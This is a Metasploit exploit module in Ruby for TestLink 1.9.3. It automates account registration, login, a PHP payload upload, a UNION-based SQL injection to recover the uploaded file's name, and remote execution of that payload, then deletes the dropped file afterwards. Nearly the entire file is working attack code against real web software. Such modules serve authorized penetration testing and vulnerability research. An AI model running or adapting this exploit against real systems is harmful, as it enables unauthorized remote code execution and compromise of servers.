##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::HttpClient

	def initialize(info={})
		super(update_info(info,
			'Name'           => "TestLink v1.9.3 Arbitrary File Upload Vulnerability",
			'Description'    => %q{
				This module exploits a vulnerability in TestLink version 1.9.3 or prior.
				This application has an upload feature that allows any authenticated
				user to upload arbitrary files to the '/upload_area/nodes_hierarchy/'
				directory with a randomized file name. The file name can be retrieved from
				the database using SQL injection.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'Brendan Coles <bcoles[at]gmail.com>' # Discovery and exploit
				],
			'References'     =>
				[
					['URL', 'http://itsecuritysolutions.org/2012-08-13-TestLink-1.9.3-multiple-vulnerabilities/']
					#['OSVDB', ''],
					#['EDB',   ''],
				],
			'Payload'        =>
				{
					'BadChars' => "\x00"
				},
			'DefaultOptions'  =>
				{
					'ExitFunction' => "none"
				},
			'Platform'       => 'php',
			'Arch'           => ARCH_PHP,
			'Targets'        =>
				[
					['Automatic Targeting', { 'auto' => true }]
				],
			'Privileged'     => false,
			'DisclosureDate' => "Aug 13 2012",
			'DefaultTarget'  => 0))

		register_options(
			[
				OptString.new('TARGETURI', [true, 'The path to the web application', '/testlink-1.9.3/'])
			], self.class)
	end

	def check

		base  = target_uri.path
		base << '/' if base[-1, 1] != '/'
		peer = "#{rhost}:#{rport}"

		# retrieve software version from login page
		begin
			res = send_request_cgi({
				'method' => 'GET',
				'uri'    => "#{base}login.php"
			})

			return Exploit::CheckCode::Unknown if res.nil?
			return Exploit::CheckCode::Vulnerable if res and res.code == 200 and res.body =~ /<p><img alt="Company logo" title="logo" style="width: 115px; height: 53px;"\s+src="[^"]+" \/>\s+<br \/>TestLink 1\.9\.3/
			return Exploit::CheckCode::Detected if res and res.body =~ /TestLink project <a href="http:\/\/testlink\.sourceforge\.net\/docs\/testLink\.php">Home<\/a><br \/>/
			return Exploit::CheckCode::Safe
		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
			print_error("#{peer} - Connection failed")
		end
		return Exploit::CheckCode::Unknown

	end

	def upload(base, fname, file)

		boundary = "----WebKitFormBoundary#{rand_text_alphanumeric(10)}"
		data_post  = "--#{boundary}\r\n"
		data_post << "Content-Disposition: form-data; name=\"uploadedFile\"; filename=\"#{fname}\"\r\n"
		data_post << "Content-Type: text/php\r\n"
		data_post << "\r\n"
		data_post << file
		data_post << "\r\n"
		data_post << "--#{boundary}\r\n"
		data_post << "Content-Disposition: form-data; name=\"MAX_FILE_SIZE\"\r\n"
		data_post << "\r\n1048576\r\n"
		data_post << "--#{boundary}\r\n"

		res = send_request_cgi({
			'method'  => 'POST',
			'uri'     => "#{base}lib/attachments/attachmentupload.php",
			'ctype'   => "multipart/form-data; boundary=#{boundary}",
			'data'    => data_post,
			'cookie'  => datastore['COOKIE'],
		})

		return res
	end

	def register(base, user, pass)

		res   = send_request_cgi({
			'method'  => 'POST',
			'uri'     => "#{base}firstLogin.php",
			'data'    => "login=#{user}&password=#{pass}&password2=#{pass}&firstName=#{user}&lastName=#{user}&email=#{user}%40#{user}.tld&doEditUser=Add+User+Data",
		})

		return res

	end

	def login(base, user, pass)

		res   = send_request_cgi({
			'method' => 'POST',
			'uri'    => "#{base}login.php",
			'data'   => "reqURI=&destination=&tl_login=#{user}&tl_password=#{pass}&login_submit=Login",
			'cookie' => datastore['COOKIE'],
		})

		return res

	end

	def on_new_session(client)
		if client.type == "meterpreter"
			client.core.use("stdapi") if not client.ext.aliases.include?("stdapi")
			client.fs.file.rm("#{@token}.php")
		else
			client.shell_command_token("rm #{@token}.php")
		end
	end


	def exploit

		base  = target_uri.path
		base << '/' if base[-1, 1] != '/'
		@peer = "#{rhost}:#{rport}"
		datastore['COOKIE'] = "PHPSESSID="+rand_text_alpha_lower(26)+";"

		# register an account
		user  = rand_text_alphanumeric(rand(10)+6)
		print_status("#{@peer} - Registering user (#{user})")
		res   = register(base, user, user)
		if res and res.code == 200 and res.body =~ /\<html\>\<head\>\<\/head\>\<body\>\<script type='text\/javascript'\>location\.href=/
			print_status("#{@peer} - Registered successfully")
		else
			print_error("#{@peer} - Registration failed")
			return
		end

		# login
		print_status("#{@peer} - Authenticating user (#{user})")
		res   = login(base, user, user)
		if res and res.code == 200 and res.body =~ /\<html\>\<head\>\<\/head\>\<body\>\<script type='text\/javascript'\>location\.href=/
			print_status("#{@peer} - Authenticated successfully")
		else
			print_error("#{@peer} - Authentication failed")
			return
		end

		# set id and table name
		id    = rand(1000)+1
		table = 'nodes_hierarchy'
		print_status("#{@peer} - Setting id (#{id}) and table name (#{table})")
		begin
			res = send_request_cgi({
				'method'  => 'GET',
				'uri'     => "#{base}lib/attachments/attachmentupload.php?id=#{id}&tableName=#{table}",
				'cookie' => datastore['COOKIE'],
			})
			if res and res.code == 200
				print_status("#{@peer} - Setting id and table name successfully")
			else
				print_error("#{@peer} - Setting id and table name failed")
				return
			end
		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
			print_error("#{@peer} - Connection failed")
			return
		end

		# upload PHP payload to ./upload_area/nodes_hierarchy/[id]/
		print_status("#{@peer} - Uploading PHP payload (#{payload.encoded.length.to_s} bytes)")
		fname  = rand_text_alphanumeric(rand(10)+6) + '.php'
		php    = %Q|<?php #{payload.encoded} ?>|
		begin
			res    = upload(base, fname, php)
			if res and res.code == 200 and res.body =~ /<p>File uploaded<\/p>/
				print_good("#{@peer} - File uploaded successfully")
			else
				print_error("#{@peer} - Uploading PHP payload failed")
				return
			end
		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
			print_error("#{@peer} - Connection failed")
			return
		end

		# attempt to retrieve real file name from directory index
		print_status("#{@peer} - Retrieving real file name from directory index.")
		begin
			res = send_request_cgi({
				'method' => 'GET',
				'uri'    => "#{base}upload_area/#{table}/#{id}/"
			})
			if res and res.code == 200 and res.body =~ /\b([a-f0-9]+)\.php/
				@token = $1
				print_good("#{@peer} - Successfully retrieved file name (#{@token})")
			else
				print_error("#{@peer} - Could not retrieve file name from directory index.")
			end

		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
			print_error("#{@peer} - Connection failed")
			return
		end

		# attempt to retrieve real file name from the database
		if @token.nil?
			print_status("#{@peer} - Retrieving real file name from the database.")
			sqli = "lib/ajax/gettprojectnodes.php?root_node=-1+union+select+file_path,2,3,4,5,6+FROM+attachments+WHERE+file_name='#{fname}'--"
			begin
				res = send_request_cgi({
					'method' => 'GET',
					'uri'    => "#{base}#{sqli}",
					'cookie' => datastore['COOKIE'],
				})
				if res and res.code == 200 and res.body =~ /\b([a-f0-9]+)\.php/
					@token = $1
					print_good("#{@peer} - Successfully retrieved file name (#{@token})")
				else
					print_error("#{@peer} - Could not retrieve file name from the database.")
					return
				end
			rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
				print_error("#{@peer} - Connection failed")
				return
			end
		end

		# retrieve and execute PHP payload
		print_status("#{@peer} - Executing payload (#{@token}.php)")
		begin
			send_request_cgi({
				'method' => 'GET',
				'uri'    => "#{base}upload_area/nodes_hierarchy/#{id}/#{@token}.php"
			})
		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
			print_error("#{@peer} - Connection failed")
			return
		end

		handler
	end
end